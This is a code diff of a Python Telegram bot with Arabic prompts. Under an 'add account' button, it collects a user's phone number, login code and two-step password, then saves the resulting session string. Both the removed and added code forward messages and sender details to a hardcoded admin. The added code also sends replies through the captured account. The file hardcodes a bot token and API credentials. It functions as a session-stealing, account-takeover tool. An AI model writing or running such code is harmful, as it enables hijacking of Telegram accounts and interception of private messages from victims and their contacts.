@@ -1,6 +1,7 @@
 import os
+from telethon.tl import functions
 from telethon.sessions import StringSession
-import asyncio, json
+import asyncio
 from kvsqlite.sync import Client as uu
 from telethon import TelegramClient, events, Button
 from telethon.errors import (
@@ -12,103 +13,105 @@ from telethon.errors import (
     PasswordHashInvalidError
 )
 
-# إعدادات البوت
+if not os.path.isdir('database'):
+    os.mkdir('database')
+
 API_ID = "21669021"
 API_HASH = "bcdae25b210b2cbe27c03117328648a2"
 admin = 7072622935
 token = "7315494223:AAFs_jejjsSrP7J8bDSprHM7KhAJ2nz3tSc"
-
-# إنشاء الجلسة
 client = TelegramClient('BotSession', API_ID, API_HASH).start(bot_token=token)
+bot = client
+
+# Create Database
 db = uu('database/elhakem.ss', 'bot')
 
-if not db.exists("account"):
-    db.set("account", {})
+if not db.exists("accounts"):
+    db.set("accounts", [])
+if not db.exists("settings"):
+    db.set("settings", {})
+if not db.exists("groups"):
+    db.set("groups", [])
 
-# دالة لإنشاء الأزرار
-def main_buttons():
-    return [[Button.inline("➕ إضافة حساب", data="add")]]
+def main_buttons(account_exists):
+    buttons = [[Button.inline("➕ إضافة حساب", data="add")]]
+    return buttons
 
 @client.on(events.NewMessage(pattern="/start", func=lambda x: x.is_private))
 async def start(event):
+    user_id = event.chat_id
+    account = db.get("account")
+    account_exists = bool(account)
     await event.reply(
-        "👋 أهلاً بك! اضغط على الزر أدناه لإضافة حساب.",
-        buttons=main_buttons()
+        "👋 أهلاً بك! يمكنك اختيار أحد الخيارات أدناه.",
+        buttons=main_buttons(account_exists)
     )
 
-@client.on(events.callbackquery.CallbackQuery(data="add"))
-async def add_account(event):
+@client.on(events.callbackquery.CallbackQuery())
+async def callback_handler(event):
+    data = event.data.decode('utf-8') if isinstance(event.data, bytes) else str(event.data)
+    user_id = event.chat_id
     account = db.get("account")
-    if account:
-        await event.edit("⚠️ يوجد حساب بالفعل. لا يمكن إضافة أكثر من حساب واحد.")
-        return
+    account_exists = bool(account)
 
-    async with client.conversation(event.chat_id) as conv:
-        await conv.send_message("✔️ الرجاء إرسال رقمك مع رمز الدولة، مثال: +201000000000")
-        phone_number = (await conv.get_response()).text.strip()
+    if data == "add":
+        if account_exists:
+            await event.edit("⚠️ يمكنك إضافة حساب واحد فقط.")
+            return
+        async with bot.conversation(user_id) as x:
+            await x.send_message("✔️الان ارسل رقمك مع رمز دولتك , مثال :+201000000000")
+            txt = await x.get_response()
+            phone_number = txt.text.replace("+", "").replace(" ", "")
+            
+            app = TelegramClient(StringSession(), API_ID, API_HASH)
+            await app.connect()
+            try:
+                await app.send_code_request(phone_number)
+            except (ApiIdInvalidError, PhoneNumberInvalidError):
+                await x.send_message("❌ هناك خطأ في API_ID أو HASH_ID أو رقم الهاتف.")
+                return
 
-        app = TelegramClient(StringSession(), API_ID, API_HASH)
-        await app.connect()
-
-        try:
-            await app.send_code_request(phone_number)
-            await conv.send_message("🔑 تم إرسال كود التحقق إلى تليجرام. الرجاء إدخال الكود بالشكل: 12345")
-            code = (await conv.get_response()).text.strip()
-
+            await x.send_message("- تم ارسال كود التحقق الخاص بك علي تليجرام. أرسل الكود بالتنسيق التالي : 1 2 3 4 5")
+            txt = await x.get_response()
+            code = txt.text.replace(" ", "")
             try:
                 await app.sign_in(phone_number, code)
                 string_session = app.session.save()
                 db.set("account", {"phone_number": phone_number, "session": string_session})
-                await conv.send_message("✅ تم تسجيل الحساب بنجاح!", buttons=main_buttons())
+                await x.send_message("- تم حفظ الحساب بنجاح ✅")
             except (PhoneCodeInvalidError, PhoneCodeExpiredError):
-                await conv.send_message("❌ الكود غير صحيح أو منتهي الصلاحية.")
+                await x.send_message("❌ الكود المدخل غير صحيح أو منتهي الصلاحية.")
             except SessionPasswordNeededError:
-                await conv.send_message("🔑 يرجى إدخال كلمة مرور التحقق بخطوتين:")
-                password = (await conv.get_response()).text.strip()
+                await x.send_message("- أرسل رمز التحقق بخطوتين الخاص بحسابك")
+                txt = await x.get_response()
+                password = txt.text
                 try:
                     await app.sign_in(password=password)
                     string_session = app.session.save()
                     db.set("account", {"phone_number": phone_number, "session": string_session})
-                    await conv.send_message("✅ تم تسجيل الحساب بنجاح!", buttons=main_buttons())
+                    await x.send_message("- تم حفظ الحساب بنجاح ✅")
                 except PasswordHashInvalidError:
-                    await conv.send_message("❌ كلمة المرور غير صحيحة.")
-        except (ApiIdInvalidError, PhoneNumberInvalidError):
-            await conv.send_message("❌ هناك خطأ في API_ID أو HASH_ID أو رقم الهاتف.")
-        finally:
-            await app.disconnect()
+                    await x.send_message("❌ رمز التحقق بخطوتين المدخل غير صحيح.")
+            finally:
+                await app.disconnect()
 
-# دالة لمراقبة الرسائل الواردة من حساب المستخدم وإرسالها للمسؤول
-async def monitor_user_messages():
+@client.on(events.NewMessage(incoming=True))
+async def incoming_message_handler(event):
     account = db.get("account")
     if account:
-        session = StringSession(account['session'])
-        user_client = TelegramClient(session, API_ID, API_HASH)
-        await user_client.connect()
-
-        @user_client.on(events.NewMessage(incoming=True))
-        async def handle_incoming_message(event):
-            sender = await event.get_sender()
-            sender_info = {
-                "ID": sender.id,
-                "اسم المستخدم": sender.username or "N/A",
-                "الاسم": sender.first_name or "N/A",
-                "رقم الهاتف": sender.phone or "N/A",
-                "الرسالة": event.message.message,
-                "تاريخ الإرسال": str(event.message.date)
-            }
-            # إرسال المعلومات إلى المسؤول
-            await bot.send_message(admin, f"📝 رسالة جديدة من {sender_info['اسم المستخدم']}:\n{json.dumps(sender_info, ensure_ascii=False, indent=2)}")
-
-        await user_client.run_until_disconnected()
-
-# بدء مراقبة الرسائل في حساب المستخدم بعد تسجيله
-async def start_monitoring():
-    while True:
-        account = db.get("account")
+        sender = await event.get_sender()
+        sender_info = f"اسم المستخدم: {sender.username or 'غير متوفر'}\n" \
+                      f"اسم العرض: {sender.first_name or ''} {sender.last_name or ''}\n" \
+                      f"معرف المستخدم: {sender.id}\n"
+        
+        await bot.send_message(admin, f"رسالة جديدة من:\n{sender_info}\nنص الرسالة:\n{event.text}")
+        
         if account:
-            await monitor_user_messages()
-        await asyncio.sleep(5)
+            app = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
+            await app.connect()
+            try:
+                await app.send_message(sender.id, "تم")
+            finally:
+                await app.disconnect()
 
-# تشغيل المراقبة كجزء من البوت
-client.loop.create_task(start_monitoring())
 client.run_until_disconnected()
